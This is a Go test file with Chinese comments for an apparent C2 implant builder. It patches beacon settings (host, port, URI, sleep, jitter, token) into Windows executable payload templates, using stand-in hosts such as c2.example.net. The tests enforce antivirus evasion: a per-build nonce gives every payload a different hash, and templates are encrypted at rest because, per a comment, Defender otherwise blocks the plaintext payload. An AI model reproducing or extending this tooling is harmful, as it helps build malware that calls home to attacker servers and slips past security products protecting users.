package main

import (
	"bytes"
	"crypto/aes"
	"crypto/sha256"
	"encoding/binary"
	"strings"
	"testing"
)

// 读回槽位里的字段, 供往返校验用。测试里独立实现一遍解析 (而不是复用 PatchConfig
// 的写入代码), 这样写错偏移时测试才会失败 —— 复用同一份常量就变成了自证。
func readBack(t *testing.T, b []byte) map[string]string {
	t.Helper()
	slot, err := findSlot(b)
	if err != nil {
		t.Fatalf("定位槽位失败: %v", err)
	}
	get := func(off, size int) string {
		raw := b[slot+off : slot+off+size]
		n := bytes.IndexByte(raw, 0)
		if n < 0 {
			n = len(raw)
		}
		return string(raw[:n])
	}
	return map[string]string{
		"host":      get(offHost, lenHost),
		"uri":       get(offURI, lenURI),
		"xform":     get(offXform, lenXform),
		"tokenSalt": get(offTokenSalt, lenTokenSalt),
		"tokenHash": get(offTokenHash, lenTokenHash),
		"idHeader":  get(offIDHeader, lenIDHeader),
		"idValue":   get(offIDValue, lenIDValue),
		"version":   string(rune(binary.LittleEndian.Uint32(b[slot+offVersion:]))),
		"port":      string(rune(binary.LittleEndian.Uint32(b[slot+offPort:]))),
	}
}

// 每个模板都必须带**恰好一个**配置槽, 且初始 version 为 0 (未启用)。
// 模板是构建期产物, 这条断言保证提交进仓库的模板没被换错。
func TestTemplatesHaveExactlyOneSlot(t *testing.T) {
	for _, format := range NativeFormats() {
		name := templateOf(format)

		b, err := loadTemplate(name)
		if err != nil {
			t.Fatalf("%s: 读模板失败: %v", format, err)
		}

		slot, err := findSlot(b)
		if err != nil {
			t.Fatalf("%s: %v", format, err)
		}

		// 再来一遍手工计数, 确认 findSlot 的"恰好一次"是真的
		count := 0
		for i := 0; i+len(cfgMagic) <= len(b); i++ {
			if bytes.Equal(b[i:i+len(cfgMagic)], cfgMagic[:]) {
				count++
			}
		}
		if count != 1 {
			t.Errorf("%s: 定位标记出现 %d 次, 必须恰好 1 次", format, count)
		}

		ver := binary.LittleEndian.Uint32(b[slot+offVersion:])
		if ver != 0 {
			t.Errorf("%s: 模板 version = %d, 应为 0 (未启用)", format, ver)
		}

		// 模板的编译期默认 host 必须是故意无效的占位值: 万一生成时漏写配置,
		// 载荷会指向 0.0.0.0 明显不工作, 而不是悄悄回连到某个真实地址
		if len(b) > slot+offHost+1 {
			if b[slot+offHost] != 0 {
				t.Errorf("%s: 模板槽位 host 非空, 应为未启用状态", format)
			}
		}
	}
}

// 写进去的值必须能原样读回来
func TestPatchConfigRoundTrip(t *testing.T) {
	tmpl, err := loadTemplate(templateOf("win2-exe"))
	if err != nil {
		t.Fatalf("读模板失败: %v", err)
	}

	cfg := PayloadCfg{
		Host:      "c2.example.net",
		Port:      6666,
		URI:       "/api/v2/gate",
		Sleep:     750,
		Jitter:    23,
		Xform:     "base64+mask",
		SSL:       true,
		TokenSalt: "0123456789abcdef",
		TokenHash: strings.Repeat("ab", 32),
		IDHeader:  "X-Request-Id",
		IDValue:   "web-01",
	}

	out, err := PatchConfig(tmpl, cfg)
	if err != nil {
		t.Fatalf("写配置失败: %v", err)
	}

	got := readBack(t, out)
	for field, want := range map[string]string{
		"host":      "c2.example.net",
		"uri":       "/api/v2/gate",
		"xform":     "base64+mask",
		"tokenSalt": "0123456789abcdef",
		"tokenHash": strings.Repeat("ab", 32),
		"idHeader":  "X-Request-Id",
		"idValue":   "web-01",
	} {
		if got[field] != want {
			t.Errorf("字段 %s = %q, 期望 %q", field, got[field], want)
		}
	}

	slot, _ := findSlot(out)
	if v := binary.LittleEndian.Uint32(out[slot+offVersion:]); v != cfgVersion {
		t.Errorf("version = %d, 期望 %d", v, cfgVersion)
	}
	if p := binary.LittleEndian.Uint32(out[slot+offPort:]); p != 6666 {
		t.Errorf("port = %d, 期望 6666", p)
	}
	if s := binary.LittleEndian.Uint32(out[slot+offSleep:]); s != 750 {
		t.Errorf("sleep = %d, 期望 750", s)
	}
	if j := binary.LittleEndian.Uint32(out[slot+offJitter:]); j != 23 {
		t.Errorf("jitter = %d, 期望 23", j)
	}
	if f := binary.LittleEndian.Uint32(out[slot+offFlags:]); f&flagSSL == 0 {
		t.Error("SSL 标志位没写进去")
	}
}

// 入参模板不能被改动 (调用方可能复用同一个模板缓冲区)
func TestPatchConfigDoesNotMutateTemplate(t *testing.T) {
	tmpl, _ := loadTemplate(templateOf("win2-console"))
	before := make([]byte, len(tmpl))
	copy(before, tmpl)

	if _, err := PatchConfig(tmpl, PayloadCfg{Host: "10.0.0.1", Port: 443, Sleep: 1000}); err != nil {
		t.Fatalf("写配置失败: %v", err)
	}
	if !bytes.Equal(tmpl, before) {
		t.Error("PatchConfig 修改了入参模板")
	}
}

// 每次生成的 nonce 必须不同 —— 否则相同配置会产出逐字节相同的载荷, 哈希完全一致
func TestNonceDiffersPerBuild(t *testing.T) {
	tmpl, _ := loadTemplate(templateOf("win2-exe"))
	cfg := PayloadCfg{Host: "10.0.0.1", Port: 8443, Sleep: 5000}

	a, err := PatchConfig(tmpl, cfg)
	if err != nil {
		t.Fatal(err)
	}
	b, err := PatchConfig(tmpl, cfg)
	if err != nil {
		t.Fatal(err)
	}
	if bytes.Equal(a, b) {
		t.Error("两次生成的产物完全相同 —— nonce 没有生效")
	}

	// 而且除了 nonce 那 4 字节, 其余应当一致 (证明确实只差 nonce)
	sa, _ := findSlot(a)
	sb, _ := findSlot(b)
	diff := 0
	for i := range a {
		if a[i] != b[i] {
			diff++
		}
	}
	if sa != sb {
		t.Errorf("两次生成的槽位偏移不同: 0x%X vs 0x%X", sa, sb)
	}
	if diff != 4 {
		t.Errorf("差异字节数 = %d, 期望恰好 4 (nonce)", diff)
	}
}

// 非法输入必须报错, 而不是生成一个"看起来成功"的错误载荷
func TestPatchConfigRejectsBadInput(t *testing.T) {
	tmpl, _ := loadTemplate(templateOf("win2-exe"))

	bad := []struct {
		name string
		cfg  PayloadCfg
	}{
		{"空地址", PayloadCfg{Host: "", Port: 8443}},
		{"地址含空格", PayloadCfg{Host: "a b", Port: 8443}},
		{"地址过长", PayloadCfg{Host: strings.Repeat("x", 200), Port: 8443}},
		{"端口为 0", PayloadCfg{Host: "1.2.3.4", Port: 0}},
		{"端口越界", PayloadCfg{Host: "1.2.3.4", Port: 70000}},
		{"只给口令盐", PayloadCfg{Host: "1.2.3.4", Port: 8443, TokenSalt: "0011223344556677"}},
		{"只给口令摘要", PayloadCfg{Host: "1.2.3.4", Port: 8443, TokenHash: strings.Repeat("a", 64)}},
	}
	for _, c := range bad {
		if _, err := PatchConfig(tmpl, c.cfg); err == nil {
			t.Errorf("%s: 应当报错但通过了", c.name)
		}
	}
}

// 字段超长要报错 —— 截断出来的地址会静默错误, 比生成失败难查得多
func TestPatchConfigRejectsOverlongField(t *testing.T) {
	tmpl, _ := loadTemplate(templateOf("win2-exe"))
	cfg := PayloadCfg{Host: "1.2.3.4", Port: 8443, URI: "/" + strings.Repeat("u", 200)}
	if _, err := PatchConfig(tmpl, cfg); err == nil {
		t.Error("超长 URI 应当报错")
	}
}

// 不受支持的格式要明确拒绝, 而不是回落到别的模板
func TestUnsupportedFormatRejected(t *testing.T) {
	for _, f := range []string{"win2-ps1", "win2-vba", "win-exe", "linux2-elf", "不存在"} {
		if SupportsNative(f) {
			t.Errorf("%s 不应被报告为原生支持", f)
		}
		if _, err := BuildPayloadNative(f, PayloadCfg{Host: "1.2.3.4", Port: 8443}); err == nil {
			t.Errorf("%s: 应当报错但通过了", f)
		}
	}
}

// 入库的模板必须是**加密**的: 服务端二进制里不能出现明文 C2 载荷,
// 否则服务端自己会被杀软静态查杀 (实测 Defender 会直接拦截构建)。
//
// 这条断言把"加密没生效"钉死 —— 一旦有人把明文模板提交进来, 测试立刻红。
func TestTemplatesAreEncryptedAtRest(t *testing.T) {
	if len(templateKeyBlob) != tmplKeyLen {
		t.Fatalf("密钥长度 = %d, 应为 %d", len(templateKeyBlob), tmplKeyLen)
	}
	for _, format := range NativeFormats() {
		name := templateOf(format)

		// 这里必须用 templateFS.ReadFile 读**入库原样**, 不能走 loadTemplate ——
		// 后者会解密, 拿解密后的内容去查"有没有明文标记"是自欺欺人
		// (这个坑我踩过一次: 批量替换把本测试也改成了 loadTemplate, 于是它永远通过不了)。
		raw, err := templateFS.ReadFile(name)
		if err != nil {
			t.Fatalf("%s: %v", format, err)
		}

		// 入库形态里绝不能搜到定位标记
		if idx := bytes.Index(raw, cfgMagic[:]); idx >= 0 {
			t.Errorf("%s: 入库模板里残留明文定位标记 (偏移 %d) —— 加密没生效", format, idx)
		}

		// 加密头之后的长度必须是分组的整数倍 (IV 16 字节 + CBC 密文)
		if len(raw) <= tmplIVLen || (len(raw)-tmplIVLen)%aes.BlockSize != 0 {
			t.Errorf("%s: 密文长度 %d 不是 AES-CBC 的合法形态", format, len(raw))
		}

		// 解密后必须能正常解析出槽位
		pt, err := decryptTemplate(raw)
		if err != nil {
			t.Errorf("%s: 解密失败: %v", format, err)
			continue
		}
		if _, err := findSlot(pt); err != nil {
			t.Errorf("%s: 解密后仍定位不到槽位: %v", format, err)
		}
	}
}

// 密钥不对时必须报错, 而不是返回半截模板 —— 半截模板会产出跑不起来的载荷
func TestDecryptRejectsWrongKey(t *testing.T) {
	// 同样要读入库原样 (密文), 否则就是拿明文去"解密"
	raw, err := templateFS.ReadFile(templateOf("win2-exe"))
	if err != nil {
		t.Fatal(err)
	}
	saved := templateKeyBlob
	defer func() { templateKeyBlob = saved }()

	bad := make([]byte, tmplKeyLen)
	copy(bad, saved)
	bad[0] ^= 0xFF
	templateKeyBlob = bad

	if _, err := decryptTemplate(raw); err == nil {
		t.Error("用错密钥竟然解密成功了")
	}
}

// 各格式的模板必须真的不同 (子系统/入口不一样), 不能是同一个文件复制了六份。
// 注意要按**整文件哈希**比 —— 只比文件头是不够的: PE 的子系统字段在可选头偏移 0x5C,
// 已经超出前 64 字节, 而四个 113KB 模板的头部正是完全相同的。
func TestTemplatesAreDistinct(t *testing.T) {
	seen := map[[32]byte]string{}
	for _, f := range NativeFormats() {
		b, err := loadTemplate(templateOf(f))
		if err != nil {
			t.Fatalf("%s: %v", f, err)
		}
		sum := sha256.Sum256(b)
		if prev, dup := seen[sum]; dup {
			t.Errorf("%s 与 %s 的模板逐字节相同 —— 格式应有结构性差异", f, prev)
		}
		seen[sum] = f
	}
}
